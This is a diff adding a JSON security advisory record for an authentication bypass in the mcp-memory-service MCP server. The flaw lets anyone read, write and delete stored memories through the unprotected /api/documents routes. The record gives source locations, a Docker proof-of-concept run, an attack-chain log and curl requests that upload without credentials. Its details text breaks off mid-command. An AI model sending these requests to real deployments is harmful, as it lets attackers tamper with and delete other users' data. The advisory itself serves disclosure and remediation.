@@ -1,0 +1,55 @@
+{
+  "schema_version": "0.1.0",
+  "id": "AGT-2026-0086",
+  "modified": "2026-07-13T16:43:53.370282269Z",
+  "published": "2026-07-02T15:26:23Z",
+  "aliases": [
+    "GHSA-84hp-mqvj-3p8h",
+    "CVE-2026-50027",
+    "PYSEC-2026-2624"
+  ],
+  "summary": "mcp-memory-service: Missing Authentication on Document API Endpoints Allows Unauthenticated Memory Read/Write/Delete",
+  "details": "## Missing Authentication on Document API Endpoints Allows Unauthenticated Memory Read/Write/Delete\n\n### Summary\n\nAll HTTP routes under `/api/documents/*` in `mcp-memory-service` are served without any authentication dependency, even when the server is configured with an API key (`MCP_API_KEY`) or OAuth. An unauthenticated remote attacker can upload arbitrary content into the memory store (write), retrieve stored document content (read), and permanently delete memories belonging to authenticated users (delete) — all without supplying any credentials. The `/api/memories` counterpart correctly enforces authentication, making this an inconsistent and exploitable authentication boundary. CVSS 9.8 Critical.\n\n### Details\n\nThe `documents.py` router is instantiated without any router-level `dependencies=` parameter and the file does not import `Depends` at all, so no authentication guard is present on any of its routes:\n\n- **`src/mcp_memory_service/web/api/documents.py:33`** — `from fastapi import APIRouter, UploadFile, File, Form, HTTPException, BackgroundTasks` (`Depends` is absent)\n- **`src/mcp_memory_service/web/api/documents.py:43`** — `router = APIRouter()` (no `dependencies=` argument)\n\nThe affected endpoints and their data-flow sinks are:\n\n| Route | Line (source) | Sink | Line (sink) |\n|---|---|---|---|\n| `POST /upload` | 149 | `storage.store(memory)` | 449 |\n| `POST /batch-upload` | — | `storage.store(memory)` | — |\n| `GET /history` | — | upload metadata response | — |\n| `GET /search-content/{upload_id}` | 729 | memory content response | 781 |\n| `DELETE /remove/{upload_id}` | — | storage deletion | — |\n| `DELETE /remove-by-tags` | 687 | `storage.delete_by_tags(tags)` | 705 |\n\nThe router is mounted in `src/mcp_memory_service/web/app.py:311`:\n\n```python\napp.include_router(documents_router, prefix=\"/api/documents\")\n```\n\nNo `CORSMiddleware` or authentication middleware applies to these routes at mount time.\n\nBy contrast, the equivalent write endpoint in `memories.py` is correctly protected:\n\n```python\n# src/mcp_memory_service/web/api/memories.py:136\nuser: AuthenticationResult = Depends(require_write_access)\n```\n\nThis demonstrates that the authentication infrastructure exists and is intentionally applied elsewhere, but was omitted from all `documents.py` routes.\n\n### PoC\n\n**Prerequisites**\n\n- Docker installed\n- Repository cloned at `repo`\n\n**Build and run the container**\n\n```bash\ndocker build -t vuln-001-mcp-memory-poc \\\n  -f vuln-001/Dockerfile \\\n  repo\n\ndocker run -d --name vuln-001-poc-container \\\n  -p 18000:8000 vuln-001-mcp-memory-poc:latest\n```\n\nThe container starts `mcp-memory-service` with `MCP_API_KEY=poc-secret-key-12345`, simulating a production deployment where the operator has enabled API-key authentication.\n\n**Execute the PoC**\n\n```bash\npython3 vuln-001/poc.py \\\n  --host 127.0.0.1 --port 18000 --api-key poc-secret-key-12345\n```\n\n**Attack chain (6 steps)**\n\n```\n[STEP 1] GET /api/memories (no auth) → HTTP 401   ← auth guard is active on memories API\n[STEP 2] POST /api/memories (with API key) → HTTP 200   ← legitimate user stores sensitive data\n[STEP 3] GET /api/memories (with API key) → HTTP 200  memories_found=1   ← data confirmed\n[STEP 4] POST /api/documents/upload (NO auth) → HTTP 200  upload_id=<uuid>   ← WRITE bypass\n[STEP 5] DELETE /api/documents/remove-by-tags (NO auth) → HTTP 200  memories_deleted=1   ← DELETE bypass\n[STEP 6] GET /api/memories (with API key) → HTTP 200  memories_remaining=0   ← integrity impact confirmed\n```\n\nStep 6 proves that an unauthenticated attacker deleted data created by a legitimately authenticated user in a single unauthenticated request.\n\n**Manual curl equivalent**\n\n```bash\n# Confirm auth guard is active on /api/memories\ncurl -i http://127.0.0.1:18000/api/memories\n# → 401 Unauthorized\n\n# Write through document API — no credentials\nprintf 'CVE_AUTH_BYPASS_MARKER' > /tmp/poc.txt\nUPLOAD_ID=$(\n  curl -s -X POST http://127.0.0.1:18000/api/documents/upload \\\n    -F \"file=@/tmp/poc.txt\" -F \n\nImported from OSV GHSA-84hp-mqvj-3p8h.",
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://osv.dev/vulnerability/GHSA-84hp-mqvj-3p8h"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/doobidoo/mcp-memory-service/security/advisories/GHSA-84hp-mqvj-3p8h"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/doobidoo/mcp-memory-service"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "mcp-memory-service"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "10.67.1"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "database_specific": {
+    "artifact_type": "mcp_server",
+    "classification": "vulnerable",
+    "verification": "verified",
+    "reporter": "osv-import",
+    "severity": "critical"
+  }
+}
